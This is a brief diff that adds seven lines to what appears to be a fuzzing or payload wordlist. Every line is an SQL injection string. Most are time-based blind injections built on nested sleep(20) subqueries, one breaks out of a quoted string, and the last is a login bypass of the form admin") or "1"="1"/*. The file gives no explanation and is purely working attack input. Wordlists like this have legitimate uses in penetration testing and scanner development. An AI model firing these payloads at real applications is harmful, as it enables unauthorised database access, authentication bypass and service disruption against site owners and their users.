@@ -1,0 +1,7 @@
+\'
+(select*from(select(sleep(20)))a)'
+ '+(select*from(select(sleep(20)))a)+'
+ and (select*from(select(sleep(20)))a)-- 
+,(select*from(select(sleep(20)))a)
+'-'
+admin") or "1"="1"/*
